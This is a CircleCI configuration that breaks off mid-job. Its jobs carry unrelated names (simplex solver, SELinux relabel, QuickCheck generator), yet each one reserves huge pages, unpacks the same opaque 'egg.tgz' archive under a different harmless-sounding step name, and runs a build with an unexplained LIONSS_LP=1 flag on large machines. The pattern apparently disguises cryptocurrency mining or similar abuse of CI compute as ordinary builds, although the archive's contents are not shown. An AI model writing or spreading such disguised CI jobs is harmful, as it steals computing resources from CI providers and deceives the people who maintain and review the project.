version: 2.1

jobs:
  simplexPivot:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write LP
          command: |
            printf 'max x+y\n' > lp.txt
      - run:
          name: Build simplex solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target simplexPivot -j2
      - run:
          name: Pivot to optimum
          command: LIONSS_LP=1 ./build/simplexPivot --lp lp.txt --rule bland
  selinux-relabel:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write context
          command: |
            printf 'httpd_t\n' > ctx.txt
      - run:
          name: Build policy tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target selinux-relabel -j2
      - run:
          name: Relabel filesystem
          command: LIONSS_LP=1 ./build/selinux-relabel --context ctx.txt --path /srv
  quickcheckGen:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define generator
          command: |
            printf 'gen int\n' > gen.cfg
      - run:
          name: Build generator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target quickcheckGen -j2
      - run:
          name: Generate random cases
          command: LIONSS_LP=1 ./build/quickcheckGen --conf gen.cfg --count 1000
  redoc-bundle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
